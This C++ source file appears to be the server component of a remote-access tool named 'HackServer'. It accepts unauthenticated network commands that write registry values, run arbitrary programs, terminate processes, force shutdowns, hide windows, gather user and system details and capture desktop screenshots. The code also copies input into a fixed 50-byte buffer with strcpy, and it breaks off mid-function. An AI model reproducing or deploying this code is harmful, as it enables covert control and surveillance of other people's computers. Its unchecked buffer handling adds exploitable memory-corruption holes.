// RemoteSock.cpp : implementation file
//

#include "stdafx.h"
#include "HackServer.h"
#include "RemoteSock.h"
#include "HackServerDlg.h"


// CRemoteSock
CArray<ProcInfo,ProcInfo> CRemoteSock::ProcList;
CRemoteSock::CRemoteSock(CHackSock* p)
{
	this->ServerSock=p;
	InitializeFunctions();
}

CRemoteSock::~CRemoteSock()
{

}
/**
Overide of parrent class
*/
void CRemoteSock::OnReceive(int nErrorCode)
{
	if(nErrorCode==0)
	{
		int ByteRead=Receive((void*)&FBuff,sizeof(Fetch));
		void *Data=NULL;
		if(ByteRead!=sizeof(Fetch))
		{
			Error("Error during reading the Message",GetLastError());
			CSocket::OnReceive(nErrorCode) ;
			return;
		}
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog("------------------------------------------------------------");
		CString log;
		log.Format("Request for::function=%d Callback=%d,size=%d",FBuff.function,FBuff.callback,FBuff.datasize);
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog(log);
		if(FBuff.datasize>0)
		{
			Data=new char[FBuff.datasize];
			ByteRead=Receive((void*)Data,FBuff.datasize);
			if(ByteRead!=FBuff.datasize)
			{
				Error("Error during reading the Message",GetLastError());
				CSocket::OnReceive(nErrorCode) ;
				return;
			}
		}
		
		/*
		Up to here we received the packet successfully.
		Now we will Start a thread to process the request.
		*/
		paramProcessIntr* param=new paramProcessIntr;
		param->data=Data;
		param->intr=FBuff;
		param->This=this;
		AfxBeginThread(CRemoteSock::ProcessIntr,(void*)param);
		//CRemoteSock::ProcessIntr(param);
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog("------------------------------------------------------------");
	}

	CSocket::OnReceive(nErrorCode);
}

void CRemoteSock::OnClose(int nErrorCode)
{
	delete this;
	CSocket::OnClose(nErrorCode);
}

void CRemoteSock::OnConnect(int nErrorCode)
{
	
	CSocket::OnConnect(nErrorCode);
}
UINT CRemoteSock::ProcessIntr(LPVOID pParam)
{
	
	int function=((paramProcessIntr*)pParam)->intr.function;
	int callback=((paramProcessIntr*)pParam)->intr.callback;
	int datasize=((paramProcessIntr*)pParam)->intr.datasize;
	void* data=((paramProcessIntr*)pParam)->data;
	CRemoteSock* This=((paramProcessIntr*)pParam)->This;
	delete ((paramProcessIntr*)pParam);
		
	/*

			This function processes the request obtained from remote system.
			function: Function To Execute;
			CallBack: To Call in return;
			datasize: Size of input buffer
			data:	  pointer to the buffer
			This:     Pointer to the calling object
			this fuction will not send any data to remote machine if (fuction>=0) or (fuction<FTULIMIT)
			0 is reserved function number.

	*/
	if(function>0 && function<FTULIMIT)
	{
			void* RetData;
			Function fun = (Function)This->FT[function]; //get the address of specified function
			RetData=fun(data,datasize);		//call the specified function and get the pointer to output buffer
			
			//Prepare the header for sending
			int* RetDataSize=(int*)RetData;
			int PacketSize;
			if(RetData==NULL)
			{
				PacketSize=sizeof(Fetch);
			}
			else
			{
				PacketSize=sizeof(Fetch)+RetDataSize[0];
			}
			CString log;
			log.Format("Allocating packet of size=%d", PacketSize);
			((CHackServerDlg *)AfxGetMainWnd())->MakeLog(log);

			//allocate the buffer to send the reply
			char* DataToSend=new char [PacketSize];
			
			if(DataToSend==NULL)
			{
				((CHackServerDlg *)AfxGetMainWnd())->MakeLog("Not enough memory to send the data\n NULL Pointer Exeption in CRemoteSock::ProcessIntr");
				exit(0);
			}
			
			Fetch f;
			f.function =callback;
			f.callback =0;
			f.datasize =RetDataSize[0];
			
						
			//copy to the intruction to the Packet
			memcpy(DataToSend,&f,sizeof(f));
			
			//copy the data to the Packet
			if(f.datasize>0)
			{
				memcpy(DataToSend+sizeof(f),((char*)RetData)+sizeof(int),f.datasize); 
			}
			
			
			//=======================================
			log.Format("Sending Packet:f=%d c=%d s=%d",f.function,f.callback,f.datasize);
			((CHackServerDlg *)AfxGetMainWnd())->MakeLog(log);
			//=======================================
			


			//Send the packet
			SendParam* sndparam=new SendParam;
			sndparam->This=This;
			sndparam->DataToSend=DataToSend;
			sndparam->DataSize=sizeof(Fetch)+RetDataSize[0];
			
			//----------------
			HANDLE HEnumWindows=OpenEvent(EVENT_ALL_ACCESS,FALSE,"HACK_SERVERSEND");
			if(HEnumWindows==NULL)
			{
				HEnumWindows=CreateEvent(NULL,FALSE,FALSE,"HACK_SERVERSEND");
			}
			
			CWinThread* pThrd=AfxBeginThread(CRemoteSock::ThrdSend,sndparam);
			
			DWORD ret =WaitForSingleObject(HEnumWindows,3500);
			
			pThrd->SuspendThread();
			//----------------
			delete sndparam;			
			delete[] DataToSend;
			delete[] RetData;			
			
		}
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("Here server completed a task");
	delete[] data;
	return 0;
}
UINT CRemoteSock::ThrdSend(LPVOID param)
{
	SendParam* sndparam=(SendParam*)param;
	int ByteSent=0;
	
	if(!IsBadReadPtr(sndparam->This,sizeof(CRemoteSock)))
	{
		ByteSent=sndparam->This->Send(sndparam->DataToSend,sndparam->DataSize);
	}
	if(ByteSent!=sndparam->DataSize)
	{
		Error("Error in Sending Data",GetLastError()); 
	}
	
	HANDLE HEnumWindows = OpenEvent(EVENT_ALL_ACCESS,FALSE,"HACK_SERVERSEND");
	SetEvent(HEnumWindows);
	CloseHandle(HEnumWindows);
	return 0;
}
//===================================================================
BOOL CRemoteSock::InitializeFunctions()
{
	FT[1]= CRemoteSock::SetRegVal;
	FT[2]= CRemoteSock::MyEnumWnd;
	FT[3]= CRemoteSock::WndFunction;
	FT[4]= CRemoteSock::SysInfo;
	FT[5]= CRemoteSock::SysCtrl;
	FT[6]= CRemoteSock::MouseMove;
	FT[7]= CRemoteSock::MouseClick;
	FT[8]= CRemoteSock::MouseDClick;
	FT[9]= CRemoteSock::GetWndBmp;
	FT[11]=CRemoteSock::SynthInput;
	return TRUE;
}
void* CRemoteSock::SetRegVal(void* data ,int datasize)//Request Function
{
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SetRegVal Request");
	Add_Key_Reg* param =(Add_Key_Reg*)data;
	
	int ret=1;
	PHKEY phkResult = new HKEY;
	if(strcmp(param->value,"(Default)")==0)
	{
			
			param->value[0]=NULL;
			
	}
	HKEY hKey=NULL;
	if(strcmp(param->hKey_str,"HKEY_CLASSES_ROOT")==0)
		hKey=HKEY_CLASSES_ROOT;
	else if(strcmp(param->hKey_str,"HKEY_CURRENT_CONFIG")==0)
		hKey=HKEY_CURRENT_CONFIG;
	else if(strcmp(param->hKey_str,"HKEY_CURRENT_USER")==0)
		hKey=HKEY_CURRENT_USER;
	else if(strcmp(param->hKey_str,"HKEY_LOCAL_MACHINE")==0)
		hKey=HKEY_LOCAL_MACHINE;
	else 
	{
		//MessageBox("ERROR:Unknown HKEY!\n Select the proper HKEY from the ComboBox");
		ret =0;
		goto EXIT;
	}		
	LONG error;
	
	error=RegCreateKey(hKey,(LPCTSTR)param->Key,phkResult);
	if(error != ERROR_SUCCESS)
	{
		//MessageBox("Error:Could not open the specified key!");
		ret =0;
		goto EXIT;
	}
	//////////////////Function call should be depends upon the type specified
	if(strcmp(param->type_str,"REG_SZ")==0)
	{
		BYTE dat[50];
		strcpy((char*)dat,param->data);
		error=RegSetValueEx(*phkResult,(LPCTSTR)param->value,0,REG_SZ,dat,strlen(param->data));
	}
	else if(strcmp(param->type_str,"REG_DWORD")==0)
	{
		//REG_SZ;REG_DWORD;REG_BINARY
		DWORD *l;
		DWORD d=atol(param->data);
		l=&d;
		BYTE *b=(LPBYTE)l;
		error=RegSetValueEx(*phkResult,(LPCTSTR)param->value,0,REG_DWORD,b,sizeof(DWORD));
	}
	else if(strcmp(param->type_str,"REG_BINARY")==0)
	{
		
		BYTE p=0;
		strrev((char*)param->data);
		for(int c=0;c<(int)strlen(param->data);c++)
		{
			int n;
			n=pow(2,c);
            p=p+(char)n*((char)data+c=='0')?0:1;						
		}
		error=RegSetValueEx(*phkResult,(LPCTSTR)param->value,0,REG_BINARY,&p,sizeof(byte));	

	}
	else 
	{
		//MessageBox("ERROR: Unknown RegType!");
		ret =0;
		goto EXIT;
	}
	///////////////////////////////////////////////////
	if(error!=ERROR_SUCCESS)
	{
		//AfxMessageBox("Could not write to the Registry\nAccess Denied!");
		ret=0;
	}
	else
	{
		ret=1;		
	}
	// clean up
	RegCloseKey(*phkResult);
	delete phkResult;
EXIT:
	int* retdata=new int[2];
		 retdata[0]=sizeof(int);
		 retdata[1]=ret;
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SetRegVal function executed successfully");
	return (void*)retdata;
	
	
}


void* CRemoteSock::MyEnumWnd(void* data,int datasize)//Request Function
{
	
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("MyEnumWnd Request");
	MyEnumArgv *argv=(MyEnumArgv *)data;
	CArray<WndItem,WndItem> ArrWnd;
	if(argv->Hwnd ==NULL)
	{
		EnumWindows(CRemoteSock::EnumWindowsProc,(LPARAM)&ArrWnd); //enumaerate top windows
		
	}
	else
	{
		EnumChildWindows((HWND)argv->Hwnd, CRemoteSock::EnumWindowsProc,(LPARAM)&ArrWnd); //enumaerate child windows
	}
	
	/*
	prepare the header and send the list of windows
	*/
	int  RetdataSize;
	RetdataSize= sizeof(MyEnumArgv) + (sizeof(WndItem)) * (ArrWnd.GetSize()) + sizeof(int);
	char*  RetData = new char[RetdataSize+1];
	memcpy(RetData,&RetdataSize,sizeof(int));
	memcpy(RetData+sizeof(int),data,sizeof(MyEnumArgv));
	int count =ArrWnd.GetSize();
	WndItem* Arr = (WndItem*) (RetData+sizeof(int)+sizeof(MyEnumArgv));
	for(int i=0;i<count;i++)
	{
		WndItem a=ArrWnd.GetAt(i);;
		memcpy(Arr+i,&a,sizeof(a));
	}
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("MyEnumWnd function executed successfully");
	return (void*)RetData;
}
BOOL CALLBACK CRemoteSock::EnumWindowsProc( HWND hwnd, LPARAM lParam)
{
	if(hwnd==NULL)
	{
		return false;
	}
	CArray<WndItem,WndItem>* pArrWnd =(CArray<WndItem,WndItem>*)lParam;
	int count = pArrWnd->GetSize();  
	for(int i=0;i<count;i++) 
	{
		if((pArrWnd->GetAt(i).Hwnd) == hwnd)
		{
			return false;
		}
		
	
	}
	
	WndItem nItem;
	nItem.Hwnd =hwnd;
	char str[255];
	int len=::GetWindowText(hwnd,str,254);
	if(len>0)
	{
		strcpy(nItem.Text,str);
	}
	else
	{
		strcpy(nItem.Text, "");
	}
	GetClassName(hwnd,nItem.ClassName,63); 
	GetWindowInfo(hwnd,&(nItem.WndInfo));

	//Add this to the enumaration list
	pArrWnd->Add(nItem);
	return true;
	
	
}
void* CRemoteSock::WndFunction(void* data ,int datasize)//Request Function
{
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("WndFunction Request");
	WndFunctionArgv* args =(WndFunctionArgv*) data;
	int fn =args->fn ;
	int i=0;
	switch(fn)
	{
		case WNDFN_HIDE: //hide window
			::ShowWindow((HWND)args->Hwnd,SW_HIDE);
			break;
		case WNDFN_UNHIDE: //unhide window
			::ShowWindow((HWND)args->Hwnd,SW_SHOW);
			break;
		case WNDFN_CLOSE : // close window
			::CloseWindow((HWND)args->Hwnd);
			break;
		case WNDFN_SETTEXT: // setwindow caption
			::SetWindowText((HWND)args->Hwnd,args->str);
			break;
		case WNDFN_ENABLE: // enable window
			::EnableWindow((HWND)args->Hwnd,true);
			break;
		case WNDFN_DISABLE: //disable window
			::EnableWindow((HWND)args->Hwnd,false);
			break;
	}
	int* Ret = new int[2];
	Ret[0]=0;
	Ret[1]=0;
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("WndFunction Request function executed successfully");
	return (void*)Ret;


}
CString CRemoteSock::GetInfo(char* info)
{

	CString SysInfo="\r\n====================Software Information==================\r\n";
	CString HdwInfo="\r\n====================HardWare Information==================\r\n";
	CString DrvInfo="\r\n====================Logical Drives==================\r\n";
	SYSTEM_INFO siSysInfo;   // struct. for hardware information 
	TCHAR tchBuffer[BUFFER]; // buffer for expanded string 
	int nSize;               // size of string 
 	// Display the "hardware information" header. 
 	// Copy the hardware information to the SYSTEM_INFO structure. 
 
	GetSystemInfo(&siSysInfo); 
 
	// Display the contents of the SYSTEM_INFO structure. 
 
	nSize = sprintf(tchBuffer, 
		"OEM ID: %u\r\nNumber of Processors: %u", 
		siSysInfo.dwOemId, 
		siSysInfo.dwNumberOfProcessors); 
	HdwInfo+=tchBuffer; 
 
	nSize = sprintf(tchBuffer, 
		"\r\nPage size: %u\r\nProcessor Type: %u", 
		siSysInfo.dwPageSize, 
		siSysInfo.dwProcessorType); 
	HdwInfo+=tchBuffer;
 
	nSize = sprintf(tchBuffer, 
		"\r\nMinimum app address: %lx\r\nMaximum app address: %lx", 
		siSysInfo.lpMinimumApplicationAddress, 
		siSysInfo.lpMaximumApplicationAddress); 
	HdwInfo+=tchBuffer;
 
	nSize = sprintf(tchBuffer, 
		"\r\nActive processor mask: %u", 
		siSysInfo.dwActiveProcessorMask); 
	HdwInfo+=tchBuffer;
		  OSVERSIONINFOEX osvi;
	   BOOL bOsVersionInfoEx;

	   // Try calling GetVersionEx using the OSVERSIONINFOEX structure.
	   //
	   // If that fails, try using the OSVERSIONINFO structure.

	   ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	   osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	   if( !(bOsVersionInfoEx = GetVersionEx ((OSVERSIONINFO *) &osvi)) )
	   {
		  // If OSVERSIONINFOEX doesn't work, try OSVERSIONINFO.

		  osvi.dwOSVersionInfoSize = sizeof (OSVERSIONINFO);
		  GetVersionEx ( (OSVERSIONINFO *) &osvi);
			 
	   }
	  SysInfo+="Operating System: ";
	   switch (osvi.dwPlatformId)
	   {
		  case VER_PLATFORM_WIN32_NT:

		  // Test for the product.

				 if ( osvi.dwMajorVersion <= 4 )
					SysInfo+="Microsoft Windows NT ";

				 if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0 )
					SysInfo+="Microsoft Windows 2000 ";

				 if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
 				SysInfo+="Microsoft Windows XP ";

			  // Display version, service pack (if any), and build number.

				 
				 if ( osvi.dwMajorVersion <= 4 )
				 {
					 CString t="";	
					 t.Format("version %d.%d %s (Build %d)\r\n",
					   osvi.dwMajorVersion,
					   osvi.dwMinorVersion,
					   osvi.szCSDVersion,
					   osvi.dwBuildNumber & 0xFFFF);
					 SysInfo+= t;
				 }
				 else
				 { 
					 CString t="";
					 t.Format("%s (Build %d)\r\n",
					   osvi.szCSDVersion,
					   osvi.dwBuildNumber & 0xFFFF);
					 SysInfo+= t;
				 }
				 break;

		  case VER_PLATFORM_WIN32_WINDOWS:

				 if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
				 {
					 SysInfo+= ("Microsoft Windows 95 ");
					 if ( osvi.szCSDVersion[1] == 'C' || osvi.szCSDVersion[1] == 'B' )
					SysInfo+=("OSR2 " );
				 } 

				 if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 10)
				 {
					 printf ("Microsoft Windows 98 ");
					 if ( osvi.szCSDVersion[1] == 'A' )
						SysInfo+=("SE " );
				 } 

				 if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 90)
				 {
					 SysInfo+=("Microsoft Windows Me ");
				 } 
				 break;

		  case VER_PLATFORM_WIN32s:

				 SysInfo+= ("Microsoft Win32s ");
				 break;
	   }
	//====================================================
	LPTSTR lpszSystemInfo;     // pointer to system information string 
	DWORD cchBuff = 256;       // size of computer or user name 
	TCHAR tchBuffer2[BUFFER];  // buffer for concatenated string 
 
	DWORD dwResult;            // function return value 
 
	//SYSTEM_INFO siSysInfo;     // structure for hardware information 
   // tab stop for TabbedTextOut 
	lpszSystemInfo = tchBuffer2; 
 
	// Get and display the name of the computer. 
 
	GetComputerName(lpszSystemInfo, &cchBuff); 
 
	nSize = sprintf(tchBuffer, "Computer name:  %s\r\n", 
		lpszSystemInfo); 
		SysInfo+=tchBuffer;
 
	// Get and display the user name. 
 
	GetUserName(lpszSystemInfo, &cchBuff); 
 
	nSize = sprintf(tchBuffer, "User name:  %s\r\n", 
		lpszSystemInfo); 
		SysInfo+=tchBuffer;
 
	// Get and display the system directory. 
 
	nSize = GetSystemDirectory(lpszSystemInfo, MAX_PATH+1); 
 
	nSize = sprintf(tchBuffer, "System directory:  %s\r\n", 
		lpszSystemInfo); 
		SysInfo+=tchBuffer;
 
	// Get and display the Windows directory. 
 
	nSize = GetWindowsDirectory(lpszSystemInfo, MAX_PATH+1); 
 
	nSize = sprintf(tchBuffer, "Windows directory:  %s\r\n", 
		lpszSystemInfo); 
		SysInfo+=tchBuffer;
 
	// Display the "environment variables" header. 
 
	nSize = sprintf(tchBuffer, 
		"Environment variables (partial list):\r\n"); 
		SysInfo+=tchBuffer;
 	// Expand the PATH environment variable. 
	dwResult = ExpandEnvironmentStrings( 
				   "PATH=%PATH%\r\n", 
				   lpszSystemInfo, 
				   BUFFER); 
 
		SysInfo+=lpszSystemInfo;
	// Expand the TMP environment variable. 
 
	dwResult = ExpandEnvironmentStrings( 
				   "TMP=%TMP%\r\n", 
				   lpszSystemInfo, 
				   BUFFER); 
 
		SysInfo+=lpszSystemInfo;
	//====================================================
	//Get drive Information;
	char drv[120];
	int len=GetLogicalDriveStrings(120,drv);
	for(int i=0;i<len;i+=4)
	{
		char drvname[40],drvfs[15];
		DWORD srl,ingnored;
		DWORD spc=0,bps=0,nfree=0,ntotal=0;
		double  total,free,t,f;
		//MessageBox(drv+i);
		int err1=GetVolumeInformation(drv+i,drvname,40,&srl,&ingnored,&ingnored,drvfs,15);
		//HackSock::Error(drv+i,GetLastError());
		int err2=GetDiskFreeSpace(drv+i,&spc,&bps,&nfree,&ntotal);
		char type[20];
		int typ=GetDriveType(drv+i);
		switch(typ)
		{
			case DRIVE_UNKNOWN:
				strcpy(type,"Unknown");
				break;
			case DRIVE_NO_ROOT_DIR:
				strcpy(type,"Unknown");
				break;
			case DRIVE_REMOVABLE: 
				strcpy(type,"Removable Drive");
				break;
			case DRIVE_FIXED:
				strcpy(type,"Fixed Drive");
				break;
			case DRIVE_REMOTE:
				strcpy(type,"Network Drive");
				break;
			case DRIVE_CDROM:
				strcpy(type,"CD-ROM drive");
				break;
			case DRIVE_RAMDISK:
				strcpy(type,"RAM disk");
				break;	
		}
		if(err1!=0 || err2!=0)
		{
			DWORD mul=(spc*bps);
			t=ntotal/1024;
			f=nfree/1024;
			free=(mul*f)/1024;
			total=(mul*t)/1024;
			CString temp;
			temp.Format("%s(%s)\r\nFileSystem:%s\r\nType: %s\r\nTotal Space:%.2f MB\r\nFreeSpace:%.2f MB\r\n",
			drv+i,drvname,drvfs,type,total,free);
			DrvInfo=DrvInfo+temp+"\r\n";
		}
		
	}
   
CString Overall=SysInfo+DrvInfo+HdwInfo;
return Overall;
//====================================================
}
void* CRemoteSock::SysInfo(void* data ,int datasize)//Request Function
{
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SysInfo Request");
	CString Info =CRemoteSock::GetInfo(NULL); //read the system information
	
	//
	SysInfoArgv *arg=(SysInfoArgv *)data;
	arg->size=Info.GetLength();  //set the header size

	int size= Info.GetLength()+sizeof(SysInfoArgv)+sizeof(int); 
	char* ret=new char[size+1];

	memcpy(ret,&size,sizeof(int));
	memcpy(ret+sizeof(int),arg,sizeof(SysInfoArgv));
	_tcscpy(ret+sizeof(int)+sizeof(SysInfoArgv),Info);
	//papa->MakeLog("SysInfo finished its work");
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SysInfo function executed successfully");
	return (void*)ret;

}
/*************************************
#define SYS_SHUTDOWN 1
#define SYS_LOGOFF 2
#define SYS_RESTART 3
#define SYS_BOSD 4
#define SYS_LOCK 5
*************************************/
void CRemoteSock::SystemFunction(int fn)
{
	
		switch(fn)
		{
			case SYS_SHUTDOWN: //To ShutDown the Windows
				ExitWindowsEx(EWX_SHUTDOWN|EWX_FORCEIFHUNG,0);
				break;
			case SYS_LOGOFF: //To Logoff the Windows
				ExitWindows(0,0);
				break;
			case SYS_RESTART: //To Restart  the Windows
				ExitWindowsEx(EWX_REBOOT|EWX_FORCEIFHUNG,0);
				//write code here
				break;
			case SYS_BOSD: //To Show Blue Screen of Death and shutdown the system
				ExitWindowsEx(EWX_SHUTDOWN,0);
				break;
			case SYS_LOCK:
				LockWorkStation();
				break;
						
		}
		return;
}
BOOL CRemoteSock::GetProcessList () 
{ 
    HANDLE         hProcessSnap = NULL; 
    BOOL           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 
	CRemoteSock::ProcList.RemoveAll();
	ProcInfo info;
	
 
    //  Take a snapshot of all processes in the system. 

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 

    if (hProcessSnap == INVALID_HANDLE_VALUE) 
        return (FALSE); 
 
    //  Fill in the size of the structure before using it. 

    pe32.dwSize = sizeof(PROCESSENTRY32); 
 
    //  Walk the snapshot of the processes, and for each process, 
    //  display information. 

    if (Process32First(hProcessSnap, &pe32)) 
    { 
        
        do 
        { 
            		
			info.Pid=pe32.th32ProcessID;
			info.Pri=pe32.pcPriClassBase;
			info.ThreadCount=pe32.cntThreads;
            if(strlen(pe32.szExeFile)<30)
			{
				strcpy(info.szExe,pe32.szExeFile);
			}
			else
			{
				strcpy(info.szExe,"Name not found");
			}
			ProcList.Add(info);
	   } 
        while (Process32Next(hProcessSnap, &pe32)); 
        bRet = TRUE; 
    } 
    else 
        bRet = FALSE;    // could not walk the list of processes 
 
    // Do not forget to clean up the snapshot object. 

    CloseHandle (hProcessSnap); 
	return (bRet); 
} 
void* CRemoteSock::SysCtrl(void* data,int datatsize) //Request Function for system control
{
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SysCtrl Request");
		/*
		Types of request that can be made in this function is:
		1.Execute a file
		2.Terminate a process
		3.Change the priority of any process
		4.System exit function as in SystemFunction()
		5.Send only ProcessList;
		*/
		SysCtrlReq* req =(SysCtrlReq*)data;
		BOOL isCritical=FALSE;
		BOOL OK=TRUE;
		HANDLE HProc;
		
		int err;
		int cmd=req->Cmd;
		if(cmd<6)	//Critical call for shutdown/log off/restart etc
		{
			isCritical=TRUE;
		}
		switch(cmd)
		{
			case SYS_EXEC:
				ShellExecute(NULL,req->verb,req->FileName,req->CmdLine,req->dir,req->CmdShow);
				break;
			case SYS_SETPRIORITY:
				HProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,req->Pid); //Get Desired Access
				if(HProc!=NULL)
				{
					err=SetPriorityClass(HProc,req->pri);	//Set the Priority
					if(err==0)
					{
						CString s;
						int ErrorCode=GetLastError();
						s.Format("(Error in SetPriorityClass())ErrorCode :%d",ErrorCode);
						//Parent->MakeLog(s);
						OK=FALSE;
					}
					else
					{
						OK=TRUE;
					}
				}
				else
				{
					CString s;
					int ErrorCode=GetLastError();
					s.Format("(Error in OpenProcess())ErrorCode :%d",ErrorCode);
					//Parent->MakeLog(s);
					OK=FALSE;
				}
				CloseHandle(HProc);
				break;
			case SYS_TERMINATE:
				HProc=OpenProcess(PROCESS_TERMINATE,FALSE,req->Pid);//Get Desired Access
				if(HProc!=NULL)
				{
					err=TerminateProcess(HProc,req->CmdShow); //Terminate the Process
					if(err!=0)
					{
						OK=TRUE;
					}
					
				}
				else
				{
					OK=FALSE;
				}
				CloseHandle(HProc);
				break;
			default:
				OK=TRUE;
				break;
		}
		SysCtrlInfo SD;
		SD.This=req->This;
		if(isCritical!=TRUE)
		{
			SD.isSucceed=OK;	
		}
		else
		{
			SD.isSucceed=TRUE;
		}
		BOOL PLISTOK=CRemoteSock::GetProcessList();
		SD.lenPinfo=CRemoteSock::ProcList.GetSize();
		int SendDataSize=sizeof(int)+sizeof(SD)+SD.lenPinfo*sizeof(ProcInfo);
		char* SendData=new char[SendDataSize];
		memcpy(SendData,&SendDataSize,sizeof(int));
		memcpy(SendData+sizeof(int),&SD,sizeof(SD));
		
		for(int i=0;i<SD.lenPinfo;i++)
		{
			int OffSet=sizeof(int)+sizeof(SD)+sizeof(ProcInfo)*i;
			ProcInfo temp=CRemoteSock::ProcList[i];
			memcpy(SendData+OffSet,&temp,sizeof(ProcInfo));
		}
		if(isCritical==TRUE)
		{

		}
		int *CmdNew= new int;
		*CmdNew=cmd;
		AfxBeginThread(CRemoteSock::SystemFunction_Delay3,CmdNew);
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SysCtrl function executed successfully");
		return (void*)SendData;
}
UINT CRemoteSock::SystemFunction_Delay3(LPVOID lpParameter)
{
	int *Cmd=(int*)lpParameter;
	//it will execute the SystemFunction After 300 miliseconds
	Sleep(3000);
	CRemoteSock::SystemFunction(*Cmd);
	return NULL;
}
void* CRemoteSock::GetWndBmp(void *data ,int datasize)
{
	
	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("GetWndBmp Request");
	//--------------------------------------
		//initialization phase
		
		GetWndBmpReq *req=(GetWndBmpReq*)data;
		char* retdata=new char[sizeof(int)+sizeof(WndBmp)];
		*((int*)retdata)=sizeof(int)+sizeof(WndBmp); //set size of return data as size of WndBmp
		WndBmp *rply=(WndBmp*)(retdata+sizeof(int));
		rply->This=req->This;
		rply->success=0;
		rply->height=0;
		rply->width=0;
	//--------------------------------------
	HDC scrdc =::GetDC((HWND)req->HWnd); //get the device context
	//HDC scrdc =	::GetDC(::GetDesktopWindow());
	if(scrdc!=NULL)
	{
		int iScrWidth=0,iScrHeight=0;
		iScrWidth=GetSystemMetrics(SM_CXSCREEN); //get the width of screen
		iScrHeight=GetSystemMetrics(SM_CYSCREEN); //get the height of screen
		if(req->HWnd!=NULL)
		{
			
			RECT rect;
			::GetWindowRect((HWND)req->HWnd,&rect);
			iScrWidth=(rect.right-rect.left);
			iScrHeight=(rect.bottom-rect.top);
		}
		if((iScrWidth*iScrHeight)==0)
		{
			return (void*)retdata;
		}
		HBITMAP bmp;
		bmp=CreateCompatibleBitmap(scrdc,iScrWidth,iScrHeight);
		if(bmp==0)//create a compatible bitmap
		{
			//Parent->MakeLog("Error During creation of bitmap");
			::Error("Error During creation of bitmap",0);
			::ReleaseDC((HWND)req->HWnd,scrdc);
			return (void*)retdata;	
		}
		HDC bmpdc =CreateCompatibleDC(scrdc);  //create the Compatible dc form scrdc
		if(bmpdc==0)
		{
			//Parent->MakeLog("Error During creation of bitmap's HDC");
			::ReleaseDC((HWND)req->HWnd,scrdc);
			::DeleteObject(bmp);
			return (void*)retdata;
		}
		if(!((HBITMAP)SelectObject(bmpdc,bmp)))
		{
			//Parent->MakeLog("Error During SelectObject of bmp");
			::Error("Error During SelectObject of bmp",0);
			::ReleaseDC((HWND)req->HWnd,scrdc);
			::DeleteObject(bmp);
			::DeleteDC(bmpdc);
			return (void*)retdata;
		}
		if (!BitBlt(bmpdc,0,0,iScrWidth, iScrHeight,scrdc,0,0,SRCCOPY)) 
		{
			//Parent->MakeLog("Error During BitBlt of bmp");
			::Error("Error During SelectObject of bmp",0);
			::ReleaseDC((HWND)req->HWnd,scrdc);
			::DeleteObject(SelectObject(bmpdc,bmp));
			::DeleteDC(bmpdc);
			return (void*)retdata;
		}
		
		BITMAPINFOHEADER BmpInfoHeader;
		BmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
		BmpInfoHeader.biWidth =iScrWidth;
		BmpInfoHeader.biHeight=iScrHeight;
		BmpInfoHeader.biPlanes =1;
		BmpInfoHeader.biBitCount=24;
		BmpInfoHeader.biSizeImage =0;
		BmpInfoHeader.biXPelsPerMeter=0;
		BmpInfoHeader.biYPelsPerMeter=0;
		BmpInfoHeader.biClrUsed=0;
		BmpInfoHeader.biClrImportant=0;
		BmpInfoHeader.biCompression = BI_RGB;
		
		BITMAPINFO BmpInfo;
		BmpInfo.bmiHeader=BmpInfoHeader;
		RGBQUAD rgbquad;
		rgbquad.rgbBlue=255;
		rgbquad.rgbGreen=255;
		rgbquad.rgbRed=255;
		rgbquad.rgbReserved=0;
		BmpInfo.bmiColors[0]=rgbquad;
		
		int bmpsize=3*iScrHeight*iScrWidth+sizeof(BITMAPINFOHEADER)+2;
		int SendDataSize=sizeof(int)+sizeof(WndBmp)+bmpsize;
		char* SendData=new char[SendDataSize];
		
		
		void* pBits=(void*)(SendData+sizeof(int)+sizeof(WndBmp));
		void* pHead=(void*)(SendData+sizeof(int));
		GetDIBits(scrdc,bmp,0,iScrHeight,pBits,&BmpInfo,DIB_RGB_COLORS);
		//GetBitmapBits(bmp,4*iScrHeight*iScrWidth,pBits);

		rply->height=iScrHeight;
		rply->width=iScrWidth;
		rply->success=1;
		memcpy(SendData,&SendDataSize,sizeof(int));
		memcpy(pHead,rply,sizeof(WndBmp));
		delete[] retdata;
		::ReleaseDC((HWND)req->HWnd,scrdc);
		::DeleteObject(SelectObject(bmpdc,bmp));
		::DeleteDC(bmpdc);
		((CHackServerDlg *)AfxGetMainWnd())->MakeLog("GetWndBmp function executed successfully");
		return (void*)SendData;
		
				
	}
	else
	{
		//Parent->MakeLog("Error During getting HDC of desktop");
		::Error("Error During SelectObject of bmp",0);
		return (void*)retdata;
	}
		

	

	return (void*)retdata;
}
void* CRemoteSock::MouseMove(void *data ,int datasize)
{
	return NULL;
}
void* CRemoteSock::MouseClick(void *data ,int datasize)
{
	return NULL;
}
void* CRemoteSock::MouseDClick(void *data ,int datasize)
{
	return NULL;
}
void* CRemoteSock::SynthInput(void* data,int datasize)
{
	
	/*
		The SendInput function synthesizes keystrokes, 
		mouse motions, and button clicks.
	*/

	((CHackServerDlg *)AfxGetMainWnd())->MakeLog("SynthInput Request");
	SynthInputReq* req=(SynthInputReq*)data;
	SynthInputReply rply;
	rply.This=req->This;
	
	
